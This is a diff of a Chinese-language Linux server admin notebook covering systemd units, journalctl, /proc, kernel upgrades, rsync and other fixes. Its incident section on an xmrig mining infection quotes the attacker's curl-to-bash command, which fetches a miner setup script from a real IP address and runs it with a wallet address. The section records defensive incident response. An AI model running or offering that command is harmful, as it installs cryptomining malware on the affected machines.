   3. /etc/issue.net 网络登录显示的信息。 登陆后显示，需要由sshd配置
@@ -1726,7 +1688,7 @@ def img_color_ascii(img,r=2):
             idx=img[y][x] * gs // 255  #获取每个点的灰度  根据不同的灰度填写相应的 替换字符
             if idx==gs:
                 idx=gs-1  #防止溢出
-			######改变这里， 将真彩值利用命令行格式化输出赋予
+   ######改变这里， 将真彩值利用命令行格式化输出赋予
             color_id = "\033[38;5;%sm%s"%(img[y][x],grays[2])      #输出！
             strline+= color_id #按行写入控制台
         print(strline)
@@ -1764,13 +1726,11 @@ FBI!!Open The Door!!!FBI!!Open The Door!!!FBI!!Open The Door!!!FBI!!Open The Doo
 
 <img src="https://gitee.com/liuzel01/picbed/raw/master/data/20210805143451_motd_after_boot_patricks.png" alt="image-20210805143450995" style="zoom:75%;" />
 
-
-
 ---
 
 参考，
 
-要显示动态提示信息，[is-it-possible-to-put-commands-in-etc-motd](https://serverfault.com/questions/459229/is-it-possible-to-put-commands-in-etc-motd), 
+要显示动态提示信息，[is-it-possible-to-put-commands-in-etc-motd](https://serverfault.com/questions/459229/is-it-possible-to-put-commands-in-etc-motd),
 
 [给服务器设置动态motd效果](https://whoisnian.com/2018/06/21/%E7%BB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AE%BE%E7%BD%AE%E5%8A%A8%E6%80%81motd%E6%95%88%E6%9E%9C/)，
 
@@ -1798,7 +1758,7 @@ source /etc/profiles || vncserver :1
 
 1. 创建一个名为sone 的systemd服务，
    1. 可以将一个项目内的所有启动服务指令，写到一个脚本内。将该项目  sone 服务开机自启即可。
-   2. ~~或是，将所有要重启的服务，都写到一个restart 脚本内，之后将该服务开机自启~~ 
+   2. ~~或是，将所有要重启的服务，都写到一个restart 脚本内，之后将该服务开机自启~~
 
 ```
 vim /lib/systemd/system/sone.service
@@ -1812,8 +1772,8 @@ ExecStart=/root/script/restart.sh
 WantedBy=default.target
 ```
 
-2. systemctl dameon-reload 
-   1. systemctl enable sone.service 
+2. systemctl dameon-reload
+   1. systemctl enable sone.service
 
 3. 还有种服务，是需要其他服务启动成功后（有时间间隔），才能启的，可以如下类似
 
@@ -1824,9 +1784,9 @@ WantedBy=default.target
 
 ##### systemctl创建kift.service 管理服务
 
-- 内网搭建了一个网盘服务[kiftd](*https://kohgylw.gitee.io/index.html#myCarousel*) ，需要做开机自启，服务目录结构如下
+- 内网搭建了一个网盘服务[kiftd](*<https://kohgylw.gitee.io/index.html#myCarousel>*) ，需要做开机自启，服务目录结构如下
 
-  `▶ tree -LN 1 /usr/local/kiftd` 
+  `▶ tree -LN 1 /usr/local/kiftd`
 
 ```
 /usr/local/kiftd
@@ -1870,7 +1830,7 @@ User=root
 Group=root
 KillMode=control-group
 # ExecStart=/bin/bash -c 'nohup /usr/bin/java -jar /usr/local/kiftd/kiftd-1.0.35-RELEASE.jar -start &'
-ExecStop=/usr/local/kiftd/kiftd stop		# 还是调脚本启动停止
+ExecStop=/usr/local/kiftd/kiftd stop  # 还是调脚本启动停止
 ExecReload=/bin/kill -s HUP $MAINPID
 PrivateTmp=true
 RemainAfterExit=yes
@@ -1905,13 +1865,11 @@ Sep 15 09:08:56 localhost.localdomain bash[15233]: [2021年09月15日 09:08:56]�
 - [systemd各字段含义-入门](https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html)  ，
   - [服务配置文件编写](https://www.junmajinlong.com/linux/systemd/service_2/)  
 
-
-
 ##### other
 
 - 查看开机启动项， systemctl list-unit-files
-  - systemctl status nginx 
-  -  systemctl is-enabled !$   查看某一服务是否开机自启，当然也可以在上面结果中查
+  - systemctl status nginx
+  - systemctl is-enabled !$   查看某一服务是否开机自启，当然也可以在上面结果中查
 
 - 其他技巧
 
@@ -1926,7 +1884,7 @@ Sep 15 09:08:56 localhost.localdomain bash[15233]: [2021年09月15日 09:08:56]�
 
    systemctl list-dependencies --all nginx18.service   列出一个Unit 所有依赖，包括target 类型
    systemctl kill nginx.service                        立即杀死服务
-   ~~systemctl daemon-reload                             将Unit 文件内容写到缓存中，所以Unit文件更新时，要systemd 重新读取~~ 
+   ~~systemctl daemon-reload                             将Unit 文件内容写到缓存中，所以Unit文件更新时，要systemd 重新读取~~
    systemctl reset-failed                              移除标记为丢失的Unit文件
    systemctl get-default                               查看启动时默认的Target，查看当前的运行级别
    systemctl set-default multi-user.target             设置默认的
@@ -1935,9 +1893,9 @@ Sep 15 09:08:56 localhost.localdomain bash[15233]: [2021年09月15日 09:08:56]�
    systemctl isolate multi-user.target                 关闭前一个Target里面所有不属于后一个Target的进程
    systemctl -l| grep -v exited | less
 
-   systemd-analyze time								从内核启动开始，至开机结束所花时间
-   
-2. 
+   systemd-analyze time        从内核启动开始，至开机结束所花时间
+
+2.
 
    journalctl -u nginx18.service                       查看指定服务的日志
    journalctl -f                                       实时滚动最新日志
@@ -1954,9 +1912,9 @@ systemd-analyze critical-chain nginx18.service      查看指定服务的启动�
 4. 排查服务日志
 
 `journalctl -u proclient.service -b` (-b，仅查看当前引导的日志消息)
-`journalctl -f` 
-`journalctl -xe` 
-`systemctl is-enabled|is-active|is-failed  anacron.service` 
+`journalctl -f`
+`journalctl -xe`
+`systemctl is-enabled|is-active|is-failed  anacron.service`
 
 `systemd-analyze verify proclient.service` 检查proclient 服务的编写有无问题
 
@@ -1983,7 +1941,7 @@ cat /etc/fstab
 
   [configuring fstab based samba share mounts](https://discourse.osmc.tv/t/configuring-fstab-based-samba-share-mounts/38167/9),  
 
-  [systemd时代的/etc/fstab](https://www.junmajinlong.com/linux/systemd/systemd_fstab/), 
+  [systemd时代的/etc/fstab](https://www.junmajinlong.com/linux/systemd/systemd_fstab/),
 
 ## logrotate转储日志文件
 
@@ -2102,7 +2060,7 @@ WantedBy=multi-user.target
 
 ## DE (desktop environment)
 
-1. <font color=orange>**下面是在centos上做的试验。**</font> 
+1. <font color=orange>**下面是在centos上做的试验。**</font>
 
 ```
 DM(desktop management): lightdm
@@ -2128,10 +2086,10 @@ WM(window management): i3wm
 enabled=true  # 改成true，可以连接vnc进行登录测试
 ```
 
-- 关闭centos启动项，[centos7优化启动项](http://doc.aiwaly.com/docs/yunwei/yunwei-1bvfa4rr9q776) 
-  - 查看所有的正在运行的进程， systemctl status -all| grep running 
+- 关闭centos启动项，[centos7优化启动项](http://doc.aiwaly.com/docs/yunwei/yunwei-1bvfa4rr9q776)
+  - 查看所有的正在运行的进程， systemctl status -all| grep running
 
-3. 要自定义桌面化的话，可参考reddit上的 [这里](https://www.reddit.com/r/unixporn/comments/pf4vvk/i3gaps_blue_is_my_favorite_color_which_blue_yes/) 
+3. 要自定义桌面化的话，可参考reddit上的 [这里](https://www.reddit.com/r/unixporn/comments/pf4vvk/i3gaps_blue_is_my_favorite_color_which_blue_yes/)
 
 ---
 
@@ -2140,24 +2098,15 @@ enabled=true  # 改成true，可以连接vnc进行登录测试
 ```txt
 WM（窗口管理器），和DE（桌面环境）是两个不同概念。同一个DE（例如GNOME）可以使用不同的WM（例如TWM FVWM Kwin）
 echo $XDG_CURRENT_DESKTOP       打印出，当前正在使用哪个桌面环境。我在vnc连接进去后的终端运行就会显示KDE, 这也证明了和我ssh远程过去的 session 并不是同一个
-	并且，在vnc连进去后和用ssh远程时，screenfetch 所打印出的信息也会有差异。vnc连进去会有DE/ WM/ WM Theme/Resolution信息
+ 并且，在vnc连进去后和用ssh远程时，screenfetch 所打印出的信息也会有差异。vnc连进去会有DE/ WM/ WM Theme/Resolution信息
 
 tty,                            打印出当前连接者用的终端，
 w                           显示所有终端，
 ```
 
-
-
 ##### manjaro-kde
 
-- 下面就是在虚拟机，对manjaro 自定义DE 
-
-
-
-
-
-
-
+- 下面就是在虚拟机，对manjaro 自定义DE
 
 # FAQ（服务器）
 
@@ -2166,59 +2115,49 @@ w                           显示所有终端，
 - /proc  目录下各文件解释，
 
 ```
-/proc/crypto		list of available cryptographic modules
-/proc/diskstats		information (including device numbers) for each of the logical disk devices
-/proc/filesystems	列出时内核支持的文件系统列表
-/proc/kmsg			保存内核输出信息
-/proc/scsi			information about any devices connected via a SCSI or RAID controller
-/proc/tty			information about the current terminals
-meminfo				summary of how the kernel is managing its memory.
-version				包含 Linux 内核版本、发行版号、gcc 版本号（用于构建内核）以及与当前运行的内核版本相关的任何其他相关信息
+/proc/crypto  list of available cryptographic modules
+/proc/diskstats  information (including device numbers) for each of the logical disk devices
+/proc/filesystems 列出时内核支持的文件系统列表
+/proc/kmsg   保存内核输出信息
+/proc/scsi   information about any devices connected via a SCSI or RAID controller
+/proc/tty   information about the current terminals
+meminfo    summary of how the kernel is managing its memory.
+version    包含 Linux 内核版本、发行版号、gcc 版本号（用于构建内核）以及与当前运行的内核版本相关的任何其他相关信息
 cmdline 
 cpuinfo 
 ```
 
 1. 获取某进程pid
 
-2. `cd /proc/$pid `  进入到某进程的目录下，
+2. `cd /proc/$pid`  进入到某进程的目录下，
 
 ```txt
 仅列出一些重要的
-less cmdline		command line of the process
-cat environ    		environmental variables
+less cmdline  command line of the process
+cat environ      environmental variables
 less fd            file descriptors
-less limits    		contains information about the limits of the process
-less mounts    		related information
-less status 		查看启动这个进程的用户所在的组
-	cat /proc/`pgrep java | grep -v grep `/status | grep -i 'groups'
-	Pid				ps命令的LWP列输出，PID是进程组。LWP是轻量级进程，也即是线程。所有的进程必须一个线程，
-		譬如，ps -Lf `pgrep java | grep -v grep `
-	PPid			当前进程的父进程，
-	
+less limits      contains information about the limits of the process
+less mounts      related information
+less status   查看启动这个进程的用户所在的组
+ cat /proc/`pgrep java | grep -v grep `/status | grep -i 'groups'
+ Pid    ps命令的LWP列输出，PID是进程组。LWP是轻量级进程，也即是线程。所有的进程必须一个线程，
+  譬如，ps -Lf `pgrep java | grep -v grep `
+ PPid   当前进程的父进程，
+ 
 
-几个常见链接： cwd		a link to the current working directory of the process
+几个常见链接： cwd  a link to the current working directory of the process
    exe                  link to the executable of the process
    root                 link to the work directory of the process
 ```
-
-
-
-
-
-
-
-
 
 ## centos7-ABRT has detected 1 problem(s)
 
 - 问题描述：
 
-1. centos服务器装完系统后，提示一句，`ABRT has detected 1 problem(s). For more info run: abrt-cli list--since 148357723` 
+1. centos服务器装完系统后，提示一句，`ABRT has detected 1 problem(s). For more info run: abrt-cli list--since 148357723`
 2. 截图如下。
 
 <img src="./images/centos7_faq_abrt.png" alt="chusergroup" style="zoom: 100%;"/>
-
-
 
 - 问题解决：
 
@@ -2259,7 +2198,7 @@ less status 		查看启动这个进程的用户所在的组
 
 6. 下载好驱动后，运行  ./autorun.sh ，报错了
 
-   1.  tar -xjf r8168-8.048.03.tar_2.bz2
+   1. tar -xjf r8168-8.048.03.tar_2.bz2
 
 ------
 
@@ -2276,8 +2215,6 @@ less status 		查看启动这个进程的用户所在的组
 - 不过服务使用的还是NetworkManager。
   - <font color=red>附：因为升级了5 版本，network好像就不太好使了，NetworkManager就被我写到自启动里了 /etc/rc.local</font>,
 
-
-
 ```bash
 192.168.10.27, 有点caoDan昂，
     lspci | grep Eth        查看 Netowrk device
@@ -2289,17 +2226,17 @@ less status 		查看启动这个进程的用户所在的组
         但是我远程连着，貌似影响不大呢，玄学
     init 6 重启
     awk -F\' '$1=="menuentry " {print i++ " : " $2}' /etc/grub2.cfg     列出已安装了的内核版本
-    	能看出，新安装的5.4 版本索引是0
+     能看出，新安装的5.4 版本索引是0
 ```
 
 3. 参考，[ethernet RTL 8168 driver on Centos](https://www.unixteacher.org/blog/ethernet-rtl-8168-driver-on-centos/)
-4.  加入到开机自启动失败，发现 /etc/rc.local 的软链接是 /etc/rc.d/rc.local
-   1. 而/etc/rc.d/rc.local 文件没有执行权限，chmod +x ;init 6 验证成功了
+4. 加入到开机自启动失败，发现 /etc/rc.local 的软链接是 /etc/rc.d/rc.local
+1. 而/etc/rc.d/rc.local 文件没有执行权限，chmod +x ;init 6 验证成功了
 5. 见[官网](http://elrepo.org/tiki/HomePage)
 
 ---
 
-- 也可以在线升级内核，[centos7在线升级最新版本内核](*https://cloud.tencent.com/developer/article/1666173*)
+- 也可以在线升级内核，[centos7在线升级最新版本内核](*<https://cloud.tencent.com/developer/article/1666173>*)
 
 ​    `rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org`
 
@@ -2315,9 +2252,9 @@ yum --disablerepo=’*’ --enablerepo=elrepo-kernel install kernel-lt-headers
 
 ​    cat /boot/grub2/grub.cfg | grep menuentry
 
-​	grub2-set-default 'CentOS Linux (5.4.93-1.el7.elrepo.x86_64) 7 (Core)'
+​ grub2-set-default 'CentOS Linux (5.4.93-1.el7.elrepo.x86_64) 7 (Core)'
 
-​		或是`grub2-set-default 0`
+​  或是`grub2-set-default 0`
 
 ​    less /etc/default/grub                       检查一下
 
@@ -2331,7 +2268,7 @@ yum --disablerepo=’*’ --enablerepo=elrepo-kernel install kernel-lt-headers
 
 - 问题描述
 
-1. 在centos7服务器上安装elasticsearch,解压jar包时,提示 jar command not found 
+1. 在centos7服务器上安装elasticsearch,解压jar包时,提示 jar command not found
 2. 解压jar包,`jar -xf x-pack-core-7.10.1.jar`
    1. 压缩打包,`jar -cfv x-pack-core-7.10.1.jar`
 
@@ -2374,11 +2311,9 @@ make: *** [strings-static] 错误 1
 
 1. 解决： yum install glibc-static
 
-
-
 ## rsync实现linux-win文件同步
 
-- [参考](*https://www.mekau.com/3773.html*)
+- [参考](*<https://www.mekau.com/3773.html>*)
 - win客户端同步linux服务器上的文件夹（将linux服务器的文件夹内容， 同步到windows客户端主机）
 - 倍智-192.168.4.247服务器， 可能由于不是管理员administrator；也可能由于是winserver服务器，暂时文件备份未成功；也可能由于win无创建ssh-keygen 秘钥导致的
 
@@ -2405,7 +2340,7 @@ secrets file = /etc/rsyncd.pwd
 123456
 ```
 
-1. win客户端，下载[cwRsync_5.4.1_x86_Free.zip](*https://download.cnet.com/cwRsync/3001-18511_4-75765181.html*)，
+1. win客户端，下载[cwRsync_5.4.1_x86_Free.zip](*<https://download.cnet.com/cwRsync/3001-18511_4-75765181.html>*)，
 
 ​    在程序 rsync.exe 同级下创建backup.bat 即可，还有文件passwd.txt，和文件夹backback，内容如下
 
@@ -2427,7 +2362,7 @@ passwd.txt
 
 <img src="https://gitee.com/liuzel01/picbed/raw/master/data/20210311163931.png" alt="rsync" style="zoom:85%;" />
 
-## cdls 别名
+<!-- ## cdls 别名
 
 - 给cd 命名别名，目前操作办法，是在系统配置里写func： vim /etc/bashrc(因为使用的root用户，为了切换用户时仍可使用，就写在了系统配置里)
 
@@ -2480,9 +2415,7 @@ xterm*)
         done
         ;;
 esac
-```
-
-
+``` -->
 
 ## 磁盘相关
 
@@ -2532,15 +2465,15 @@ esac
 2. 加引号防止扩展
    1. 单引号 ''  防止所有扩展
    2. 双引号 ""  防止扩展，但$ 除外
-3. set -e 如果一个命令返回一个非0 退出状态（失败）就退出，等同 set -o errexit 
+3. set -e 如果一个命令返回一个非0 退出状态（失败）就退出，等同 set -o errexit
 
 ## 更改网卡名
 
 - 重装系统为 centos7，
-  	原网卡名为：
-    	要更改为 ifcfg-enp1s0
+   原网卡名为：
+     要更改为 ifcfg-enp1s0
 - 需要注意的是：只是更改名称，而设备并没有变，所以uuid 可以根据之前的网卡名来获取到；HWADDR：俺也一样
-   - `ifconfig | grep -C 5 eth0 | grep ether`  
+  - `ifconfig | grep -C 5 eth0 | grep ether`  
 
 ```
 ifstat
@@ -2548,8 +2481,8 @@ uuidgen enp1s0
 既然uuid可以获取到，那HWADDR（mac地址）同样能在服务器找到~  
 ```
 
-修改网络配置，	vim /etc/sysconfig/network-scripts/ifcfg-enp1s0
-		更改有关，NAME DEVICE UUID HWADDR 这几样参数
+修改网络配置， vim /etc/sysconfig/network-scripts/ifcfg-enp1s0
+  更改有关，NAME DEVICE UUID HWADDR 这几样参数
 
 这几项更改完后，基本按照正常流程，就没得其他要改动的点了
 
@@ -2557,7 +2490,7 @@ uuidgen enp1s0
 
   ```
   vim /etc/sysconfig/grub 在倒数第二行 quit 后添加如下：
-  		net.ifnames=0 biosdevname=0
+    net.ifnames=0 biosdevname=0
   执行， grub2-mkconfig -o /boot/grub2/grub.cfg  来生成新的 grub.cfg文件
   ```
 
@@ -2570,16 +2503,16 @@ uuidgen enp1s0
 
    `nohup /usr/java/jdk1.8.0_271/bin/java -Xms512m -Xmx1024m -jar ${APP_NAME} > nohup-admin.log 2>&1 &`  
 
-<font color=orange>**现象： **</font> 
+<font color=orange>**现象：**</font>
 
 1. 经过一段时间，nohup-admin.log文件 会很大，几十M
-   1. du -sh nohup-admin.log 
+   1. du -sh nohup-admin.log
 2. 当你用  `echo > nohup-admin.log` ，再查看文件大小，发现为零。 但再次访问服务，日志文件又会马上回到之前几十M 的大小
    1. 并且，会发现log文件顶端有大量的null...
    2. 可以尝试， cat /dev/null > nohup-admin.log
-3. 这是典型的磁盘空间未释放的缘故。内容清空，但实际上写入的位置并没重置到文件起始位置，为覆盖写；因此重新写入时都以null占位。<u>所以是以nohup启动，重定向到nohup-admin.log  时出的问题</u> 
+3. 这是典型的磁盘空间未释放的缘故。内容清空，但实际上写入的位置并没重置到文件起始位置，为覆盖写；因此重新写入时都以null占位。<u>所以是以nohup启动，重定向到nohup-admin.log  时出的问题</u>
 
-<font color=orange>**解决： **</font> 
+<font color=orange>**解决：**</font>
 
 1. 将启动脚本修改为： >> nohup-admin.log 2>&1 &  对日志文件追加写。验证可行
 2. 这样在清空文件时，写入位置置零，追加写入则从起始位置开始写
@@ -2589,7 +2522,7 @@ uuidgen enp1s0
 
 ## xmrig挖矿 病毒入侵
 
-<font color=orange>**现象： **</font> 
+<font color=orange>**现象：**</font>
 
 1. 云服务商通过查看网络、流量情况，发现有问题，
 
@@ -2605,7 +2538,7 @@ uuidgen enp1s0
 
    4. vim /root/.bash_history   检查服务器会话日志
 
-      ​	因为一直在向外发送请求，然后建立了tcp连接，过程中超时了触发了tcp重传机制。所以防火墙和ss  并没有异常端口
+      ​ 因为一直在向外发送请求，然后建立了tcp连接，过程中超时了触发了tcp重传机制。所以防火墙和ss  并没有异常端口
 
 3. 如何落地的
    1. 从服务器会话日志，得知落地方法：  通过下载外网脚本实现，我下面摘抄一部分
@@ -2625,7 +2558,7 @@ yum -y install curl;apt install curl -y;curl -s -L http://129.226.180.53/xmrig_s
 curl -s -L http://129.226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 429uoEyr56F785ZV37v3toR5Es9M79cUvgrbZFP1w2oMDsnYt3aZJ1a5o5RT9osdF65UpcFq9jQECBPqNmXznCih38MGMWS
 ```
 
-<font color=orange>**解决： **</font> 
+<font color=orange>**解决：**</font>
 
 1. 将病毒文件夹下，文件更改名字
 
@@ -2633,7 +2566,7 @@ curl -s -L http://129.226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh | 
 
 2. 最后，为防止从外部下载病毒文件， /etc/yum.repos.d/  文件改名字。 并且卸载 curl wget 等命令
 
-   rpm -q curl 
+   rpm -q curl
 
    rpm -e --nodeps curl-xxxxxx
 
@@ -2644,13 +2577,13 @@ curl -s -L http://129.226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh | 
 
 1. 创建免疫文件
 
-   ​	mkdir -p /root/.ryukd.sh （病毒脚本名称）
+   ​ mkdir -p /root/.ryukd.sh （病毒脚本名称）
 
-   ​	chmod 000 /root/.ryukd.sh
+   ​ chmod 000 /root/.ryukd.sh
 
-   ​	或者， mkdir -p /root/c3pool
+   ​ 或者， mkdir -p /root/c3pool
 
-   ​				chattr +i -R /root/c3pool
+   ​    chattr +i -R /root/c3pool
 
 2. 大致这么几步，不成熟的推测
 
@@ -2671,7 +2604,7 @@ curl -s -L http://129.226.180.53/xmrig_setup/raw/master/setup_c3pool_miner.sh | 
 
 **记录下排查过程：**
 
-​	OS为centos7， 6的话，可能还要安装另外...
+​ OS为centos7， 6的话，可能还要安装另外...
 vim /var/logs/maillog 跟踪日志
 netstat -tlnp | grep :25
 nmap 127.0.0.1 -p 25 检查服务是否开启了
